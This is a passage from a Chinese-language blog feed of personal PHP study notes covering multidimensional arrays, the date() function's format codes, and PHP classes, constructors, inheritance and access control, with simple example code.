class="string">'google'</span>][<span class="symbol">0</span>];</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">淘宝地址请Google 搜索</span><br></pre></td></tr></table></figure></p><h1 id="日期"><a href="#日期" class="headerlink" title="日期"></a>日期</h1><h2 id="data-函数"><a href="#data-函数" class="headerlink" title="data()函数"></a>data()函数</h2><p>PHP中使用data()函数把时间戳格式化为可读性更好的日期和时间</p><p>语法<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="keyword">date</span> ( <span class="keyword">string</span> $format [, <span class="keyword">int</span> $timestamp ] )</span><br></pre></td></tr></table></figure><br>其中format是必须存在的，timestamp是可选的，规定时间戳</p><h2 id="格式化日期"><a href="#格式化日期" class="headerlink" title="格式化日期"></a>格式化日期</h2><p>data()函数中的第一个参数format规定了如何格式化日期和时间</p><ul><li>d 代表天</li><li>m 代表月份</li><li>Y 代表年(四位数)</li></ul><p>还可以插入/,-之类的字符来增加可读性</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">date</span>(<span class="string">"Y/m/d"</span>) . <span class="string">"\n"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">date</span>(<span class="string">"Y.m.d"</span>) . <span class="string">"\n"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">date</span>(<span class="string">"Y-m-d"</span>);</span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">12</span></span><br><span class="line"><span class="number">2020.07</span><span class="number">.12</span></span><br><span class="line"><span class="number">2020</span><span class="number">-07</span><span class="number">-12</span></span><br></pre></td></tr></table></figure></p><div class="table-container"><table><thead><tr><th>format</th><th>说明</th><th>返回值例子</th></tr></thead><tbody><tr><td>d</td><td>月份中的第几天</td><td>01到31</td></tr><tr><td>D</td><td>星期中的第几天</td><td>Mon到Sun</td></tr><tr><td>j</td><td>月份中的第几天，无前导零</td><td>1到31</td></tr><tr><td>l</td><td>星期几 完整格式</td><td>Sunday到Saturday</td></tr><tr><td>w</td><td>星期几 数字表示</td><td>0到6</td></tr><tr><td>z</td><td>年份中的第几天</td><td>0到356</td></tr><tr><td>F</td><td>月份，完整格式</td><td>January到December</td></tr><tr><td>m</td><td>数字表示月份</td><td>01到12</td></tr><tr><td>M</td><td>三个字母缩写月份</td><td>Jan到Dec</td></tr><tr><td>n</td><td>数字表示月份 无前置</td><td>1到12</td></tr><tr><td>Y</td><td>4位数字完整年份</td><td>1999或2003</td></tr><tr><td>y</td><td>2位数字表示年份</td><td>99或03</td></tr><tr><td>g</td><td>小时，12小时 无前置</td><td>1到12</td></tr><tr><td>G</td><td>小时 24小时 无前置</td><td>0到23</td></tr><tr><td>h</td><td>小时 12小时</td><td>01到12</td></tr><tr><td>H</td><td>小时 24小时</td><td>00到23</td></tr><tr><td>s</td><td>秒</td><td>00到59</td></tr></tbody></table></div><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.多维数组基本和C++相似，调用方式也一样，基本不变，参考C++即可</p><p>2.data函数的format参数是必须的，可以加上/ . -等符号来增加可读性</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;多维数组&quot;&gt;&lt;a href=&quot;#多维数组&quot; class=&quot;headerlink&quot; title=&quot;多维数组&quot;&gt;&lt;/a&gt;多维数组&lt;/h1&gt;&lt;p&gt;一个数组中的值可以是另一个数组&lt;/p&gt;
&lt;figure class=&quot;highlight angelscript&quot;&gt;&lt;tab
      
    
    </summary>
    
    
      <category term="日常学习" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="PHP" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/PHP/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP-2020/7/10-学习日记</title>
    <link href="http://yoursite.com/2020/07/10/PHP-2020-7-10-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/07/10/PHP-2020-7-10-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</id>
    <published>2020-07-10T13:03:29.000Z</published>
    <updated>2020-07-10T13:25:32.262Z</updated>
    
    <content type="html"><![CDATA[<h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><p>面向对象已经很熟悉了，基本上就一句话总结，类是虚指，对象是类的实例</p><h2 id="对象内容"><a href="#对象内容" class="headerlink" title="对象内容"></a>对象内容</h2><ul><li>类 − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作</li><li>对象 − 是类的实例</li><li>成员变量 − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的属性</li><li>成员函数 − 定义在类的内部，可用于访问对象的数据</li></ul><p>例如<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">$mercedes</span> = <span class="keyword">new</span> Car ()<span class="comment">;</span></span><br><span class="line"><span class="built_in">$bmw</span> = <span class="keyword">new</span> Car ()<span class="comment">;</span></span><br><span class="line"><span class="built_in">$audi</span> = <span class="keyword">new</span> Car ()<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><h2 id="类定义"><a href="#类定义" class="headerlink" title="类定义"></a>类定义</h2><p>定义类通常语法格式如下:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">phpClass</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">var</span> $var1;</span></span><br><span class="line"><span class="php">  <span class="keyword">var</span> $var2 = <span class="string">"constant string"</span>;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">myfunc</span> <span class="params">($arg1, $arg2)</span> </span>&#123;</span></span><br><span class="line"><span class="php">     [..]</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  [..]</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>类使用class关键字后加上类名定义</p><p>类名后的一对大括号内可以定义变量和方法</p><p>类的变量使用var来声明，也可以直接初始化值</p><p>函数定义不变，但是函数只能通过实例化的类来使用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="comment">/* 成员变量 */</span></span></span><br><span class="line"><span class="php">  <span class="keyword">var</span> $url;</span></span><br><span class="line"><span class="php">  <span class="keyword">var</span> $title;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  <span class="comment">/* 成员函数 */</span></span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span><span class="params">($par)</span></span>&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">$this</span>-&gt;url = $par;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">getUrl</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;url . PHP_EOL;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span><span class="params">($par)</span></span>&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">$this</span>-&gt;title = $par;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;title . PHP_EOL;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><ul><li>$this 代表自身的对象</li><li>PHP_EOL为换行符</li></ul><h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><p>创建对象使用new关键字来实例化<br><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$ru</span>noob = <span class="keyword">new</span> Site;</span><br><span class="line"><span class="symbol">$tao</span>bao = <span class="keyword">new</span> Site;</span><br><span class="line"><span class="symbol">$google</span> = <span class="keyword">new</span> Site;</span><br></pre></td></tr></table></figure></p><h3 id="调用成员方法"><a href="#调用成员方法" class="headerlink" title="调用成员方法"></a>调用成员方法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 调用成员函数，设置标题和URL</span></span><br><span class="line">$runoob-&gt;setTitle( <span class="string">"菜鸟教程"</span> );</span><br><span class="line">$taobao-&gt;setTitle( <span class="string">"淘宝"</span> );</span><br><span class="line">$google-&gt;setTitle( <span class="string">"Google 搜索"</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用成员函数，获取标题和URL</span></span><br><span class="line">$runoob-&gt;getTitle();</span><br><span class="line">$taobao-&gt;getTitle();</span><br><span class="line">$google-&gt;getTitle();</span><br></pre></td></tr></table></figure><p>完整演示<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="comment">/* 成员变量 */</span></span></span><br><span class="line"><span class="php">  <span class="keyword">var</span> $url;</span></span><br><span class="line"><span class="php">  <span class="keyword">var</span> $title;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  <span class="comment">/* 成员函数 */</span></span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span><span class="params">($par)</span></span>&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">$this</span>-&gt;url = $par;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">getUrl</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;url . PHP_EOL;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span><span class="params">($par)</span></span>&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">$this</span>-&gt;title = $par;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;title . PHP_EOL;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$runoob = <span class="keyword">new</span> Site;</span></span><br><span class="line"><span class="php">$taobao = <span class="keyword">new</span> Site;</span></span><br><span class="line"><span class="php">$google = <span class="keyword">new</span> Site;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 调用成员函数，设置标题和URL</span></span></span><br><span class="line"><span class="php">$runoob-&gt;setTitle( <span class="string">"菜鸟教程"</span> );</span></span><br><span class="line"><span class="php">$taobao-&gt;setTitle( <span class="string">"淘宝"</span> );</span></span><br><span class="line"><span class="php">$google-&gt;setTitle( <span class="string">"Google 搜索"</span> );</span></span><br><span class="line"></span><br><span class="line"><span class="php">$runoob-&gt;setUrl( <span class="string">'www.runoob.com'</span> );</span></span><br><span class="line"><span class="php">$taobao-&gt;setUrl( <span class="string">'www.taobao.com'</span> );</span></span><br><span class="line"><span class="php">$google-&gt;setUrl( <span class="string">'www.google.com'</span> );</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 调用成员函数，获取标题和URL</span></span></span><br><span class="line"><span class="php">$runoob-&gt;getTitle();</span></span><br><span class="line"><span class="php">$taobao-&gt;getTitle();</span></span><br><span class="line"><span class="php">$google-&gt;getTitle();</span></span><br><span class="line"></span><br><span class="line"><span class="php">$runoob-&gt;getUrl();</span></span><br><span class="line"><span class="php">$taobao-&gt;getUrl();</span></span><br><span class="line"><span class="php">$google-&gt;getUrl();</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">菜鸟教程</span><br><span class="line">淘宝</span><br><span class="line"><span class="selector-tag">Google</span> 搜索</span><br><span class="line"><span class="selector-tag">www</span><span class="selector-class">.runoob</span><span class="selector-class">.com</span></span><br><span class="line"><span class="selector-tag">www</span><span class="selector-class">.taobao</span><span class="selector-class">.com</span></span><br><span class="line"><span class="selector-tag">www</span><span class="selector-class">.google</span><span class="selector-class">.com</span></span><br></pre></td></tr></table></figure></p><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>使用 _construct(mixed $args[,$…])来定义构造函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">( $par1, $par2 )</span> </span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;url = $par1;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;title = $par2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用法与C++一样</p><h2 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h2><p>使用_destructor来定义析构函数<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">MyDestructableClass</span> </span>&#123;</span></span><br><span class="line"><span class="php">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">       <span class="keyword">print</span> <span class="string">"构造函数\n"</span>;</span></span><br><span class="line"><span class="php">       <span class="keyword">$this</span>-&gt;name = <span class="string">"MyDestructableClass"</span>;</span></span><br><span class="line"><span class="php">   &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">       <span class="keyword">print</span> <span class="string">"销毁 "</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">   &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$obj = <span class="keyword">new</span> MyDestructableClass();</span></span><br></pre></td></tr></table></figure><br>析构函数如果没有特别操作可以不写，系统会自动调用终结对象生命周期</p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>使用extends关键字来继承一个类，PHP为单继承语言<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">   <span class="comment">// 代码部分</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>继承的类会拥有被继承类的所有函数和方法，除构造和析构函数</p><h2 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h2><p>如果父类继承的方法不能满足子类的需求，就可以对其进行重写，也可以称为覆盖<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUrl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;url . PHP_EOL;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;url;</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTitle</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;title . PHP_EOL;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;title;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h2><p>和C++基本一直，都有三个访问控制</p><ul><li>public 公有</li><li>protected 受保护</li><li>private 私有</li></ul><h3 id="属性的访问控制"><a href="#属性的访问控制" class="headerlink" title="属性的访问控制"></a>属性的访问控制</h3><p>如果使用var定义，则默认为公有<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line">/**</span><br><span class="line"> * Define MyClass</span><br><span class="line"><span class="php"> */</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $public = <span class="string">'Public'</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $protected = <span class="string">'Protected'</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $private = <span class="string">'Private'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">printHello</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;public;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;protected;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;private;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$obj = <span class="keyword">new</span> MyClass();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $obj-&gt;public; <span class="comment">// 这行能被正常执行</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $obj-&gt;protected; <span class="comment">// 这行会产生一个致命错误</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $obj-&gt;private; <span class="comment">// 这行也会产生一个致命错误</span></span></span><br><span class="line"><span class="php">$obj-&gt;printHello(); <span class="comment">// 输出 Public、Protected 和 Private</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Define MyClass2</span><br><span class="line"><span class="php"> */</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">MyClass2</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// 可以对 public 和 protected 进行重定义，但 private 而不能</span></span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $protected = <span class="string">'Protected2'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">printHello</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;public;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;protected;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;private;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$obj2 = <span class="keyword">new</span> MyClass2();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $obj2-&gt;public; <span class="comment">// 这行能被正常执行</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $obj2-&gt;private; <span class="comment">// 未定义 private</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $obj2-&gt;protected; <span class="comment">// 这行会产生一个致命错误</span></span></span><br><span class="line"><span class="php">$obj2-&gt;printHello(); <span class="comment">// 输出 Public、Protected2 和 Undefined</span></span></span><br></pre></td></tr></table></figure></p><h3 id="方法的访问控制"><a href="#方法的访问控制" class="headerlink" title="方法的访问控制"></a>方法的访问控制</h3><p>方法和函数基本一致<br>没有设置关键字，则默认为公有<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line">/**</span><br><span class="line"> * Define MyClass</span><br><span class="line"><span class="php"> */</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// 声明一个公有的构造函数</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// 声明一个公有的方法</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">MyPublic</span><span class="params">()</span> </span>&#123; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// 声明一个受保护的方法</span></span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">MyProtected</span><span class="params">()</span> </span>&#123; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// 声明一个私有的方法</span></span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">MyPrivate</span><span class="params">()</span> </span>&#123; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// 此方法为公有</span></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">Foo</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;MyPublic();</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;MyProtected();</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;MyPrivate();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$myclass = <span class="keyword">new</span> MyClass;</span></span><br><span class="line"><span class="php">$myclass-&gt;MyPublic(); <span class="comment">// 这行能被正常执行</span></span></span><br><span class="line"><span class="php">$myclass-&gt;MyProtected(); <span class="comment">// 这行会产生一个致命错误</span></span></span><br><span class="line"><span class="php">$myclass-&gt;MyPrivate(); <span class="comment">// 这行会产生一个致命错误</span></span></span><br><span 